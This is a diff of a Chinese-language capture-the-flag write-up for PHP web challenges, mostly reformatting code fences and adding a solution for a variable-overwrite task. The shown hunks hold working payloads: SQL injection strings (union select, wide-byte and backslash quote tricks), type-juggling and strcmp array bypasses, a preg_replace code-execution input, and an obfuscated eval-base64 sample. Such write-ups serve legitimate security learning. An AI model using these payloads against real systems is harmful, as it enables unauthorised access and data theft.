@@ -12,8 +12,7 @@ tags:
 进入页面，右键源代码，得到Flag
 <Br />
 ### md5 collision
-```
-<?php
+```php
 $md51 = md5('QNKCDZO');
 $a = @$_GET['a'];
 $md52 = @md5($a);
@@ -24,10 +23,9 @@ if ($a != 'QNKCDZO' && $md51 == $md52) {
     echo "false!!!";
 }}
 else{echo "please input a";}
-?>
 ```
 审计后，利用php的弱类型实现hash加密的相等
-```php
+```
 // payload
 url?a=s878926199a
 
@@ -66,8 +64,7 @@ bp抓包，或者禁用JS都可行
 <Br />
 
 ### php decode
-```
-<?php
+```php
 function CLsI($ZzvSWE) {
 
     $ZzvSWE = gzinflate(base64_decode($ZzvSWE));
@@ -80,7 +77,7 @@ function CLsI($ZzvSWE) {
 
     return $ZzvSWE;
 
-}eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));?>
+}eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));
 ```
 将源码的eval()换成`echo CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==")`，在本地环境直接执行PHP代码，可以得到flag
 <Br />
@@ -109,8 +106,7 @@ function CLsI($ZzvSWE) {
 
 ### MYSQL
 根据提示的robots.txt文件中，看见sql.php源码
-```
-<?php
+```php
 if($_GET[id]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
   mysql_select_db(SAE_MYSQL_DB);
@@ -123,7 +119,6 @@ if($_GET[id]) {
     echo($query[content]);
   }
 }
-?>
 ```
 审计后得知，满足两个条件
  - `intval($_GET[id])=1024`
@@ -160,7 +155,7 @@ url?id=1%df' and 0 union select id,flag from ctf4 %23 // nctf{*****}
 <Br />
 
 ### /x00
-```
+```php
 if (isset ($_GET['nctf'])) {
         if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
             echo '必须输入数字才行';
@@ -178,7 +173,7 @@ url?nctf[]=1
 <Br />
 
 ### bypass again
-```
+```php
 if (isset($_GET['a']) and isset($_GET['b'])) {
 if ($_GET['a'] != $_GET['b'])
 if (md5($_GET['a']) === md5($_GET['b']))
@@ -196,13 +191,12 @@ url?a=QNKCDZO&b=s878926199a
 
 ### 变量覆盖
 主要代码
-```
-<?php
-  if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        extract($_POST);
-        if ($pass == $thepassword_123)
-          echo $theflag;
-  }
+```php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+      extract($_POST);
+      if ($pass == $thepassword_123)
+        echo $theflag;
+}
 ```
 审计后得知extract()漏洞
 ```
@@ -213,8 +207,7 @@ thepassword_123=123&pass=123
 
 ### PHP是世界上最好的语言
 根据页面提示查看index.txt文件中源码
-```
-<?php
+```php
 if(eregi("hackerDJ",$_GET[id])) {
   echo("<p>not allowed!</p>");
   exit();
@@ -226,7 +219,6 @@ if($_GET[id] == "hackerDJ")
   echo "<p>Access granted!</p>";
   echo "<p>flag: *****************} </p>";
 }
-?>
 ```
 审计后得知url二次编码绕过
 `url?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61`
@@ -281,8 +273,7 @@ Content-Type: image/jpeg
 
 ### SQL注入1
 进入页面，直接看源码
-```
-<?php
+```php
 if($_POST[user] && $_POST[pass]) {
     mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
   mysql_select_db(SAE_MYSQL_DB);
@@ -299,7 +290,6 @@ if($_POST[user] && $_POST[pass]) {
   }
 }
 echo $query[user];
-?>
 ```
 审计后得到几个条件
  - 对参数进行了除空格，可以用+号或者`/**/`去代替空格
@@ -316,8 +306,7 @@ user=') union select 'admin' #&pass=1 //union也可以达到目的，不过反�
 <Br />
 
 ### pass check
-```
-<?php
+```php
 $pass=@$_POST['pass'];
 $pass1=***********;//被隐藏起来的密码
 if(isset($pass))
@@ -330,7 +319,6 @@ echo "the pass is wrong!";
 }else{
 echo "please input pass!";
 }
-?>
 ```
 发现可以利用strcmp()漏洞来绕过，得到flag
 ```
@@ -340,10 +328,8 @@ pass[]=123
 <Br />
 
 ### 起名字真难
-```
-<?php
-<?php
- function noother_says_correct($number)
+```php
+function noother_says_correct($number)
 {
         $one = ord('1');
         $nine = ord('9');
@@ -362,7 +348,6 @@ if(noother_says_correct($_GET['key']))
     echo $flag;
 else
     echo 'access denied';
-?>
 ```
 **得到一个经验，审计一定要非常非常非常的细心和仔细**
 开始就审题理解错误，后来自己调试了下，仔细查看之后，用PHP弱类型特性，**当0x开头的字符串和字符串比较，会转为同一类型进行比较**
@@ -379,7 +364,7 @@ url?key=0xccccccccc // 0xccccccccc == '54975581388'
 <Br />
 
 ### SQL Injection
-```
+```php
 <!--
 #GOAL: login as admin,then get the flag;
 error_reporting(0);
@@ -407,12 +392,10 @@ echo $flag;
 提示给的很明显了。。源代码也给自己，开始自己给绕进去了，后来看了别人的write up 恍然大悟
 首先把`$query`给简单的折合一下就是
 
-```
-<?php
+```php
 $query="SELECT * FROM users WHERE name='$username' AND pass='$password'";
 // 其实简化后就是这样，开始绕进去就是我以为\是在入库后转义，脑壳瓦特了
 // 而且居然有源码情况下，居然懒得调试，哎..
-?>
 ```
 其实就是在PHP拼接的时候，利用`\`吃掉单引号，然后在利用第二个参数的单引号，完成条件满足
 ```
@@ -434,8 +417,7 @@ url?username=\&password=||1%23
 <Br />
 
 ### SQL注入2
-```
-<?php
+```php
 if($_POST[user] && $_POST[pass]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
   mysql_select_db(SAE_MYSQL_DB);
@@ -449,7 +431,6 @@ if($_POST[user] && $_POST[pass]) {
     echo("<p>Log in failure!</p>");
   }
 }
-?>
 ```
 根据提示，审计源码，直接得出payload
 ```
@@ -517,7 +498,7 @@ www=preg_replace&wtf=print_r(scandir("./"))
 ### 密码重置2
 题目非常明显，进入页面，除了index.php外，请求提交的页面是submit.php
 提示说有vi的临时文件，直接访问两个页面，发现`.submit.php.swp`有
-```
+```php
 if(!empty($token)&&!empty($emailAddress)){
 	if(strlen($token)!=10) die('fail');
 	if($token!='0') die('fail');
@@ -547,7 +528,25 @@ url?file=php://input
 
 ### 变量覆盖
 进入页面为空，查看源代码，审计之后得知....
-暂时没思路，感觉对$chs变量也无法控制，等大佬解说一波
+```php
+<!--foreach($_GET as $key => $value){  
+        $$key = $value;  
+}  
+if($name == "meizijiu233"){
+    echo $flag;
+}-->
+
+
+如果传入url?name=meizijiu233，那么在第一次循环时
+$value="meizijiu233"
+$key="name"
+$$key=$name
+$name=$value
+$name="meizijiu233"
+触发变量覆盖漏洞，得到flag。
+```
+
+
 
 <Br />
 
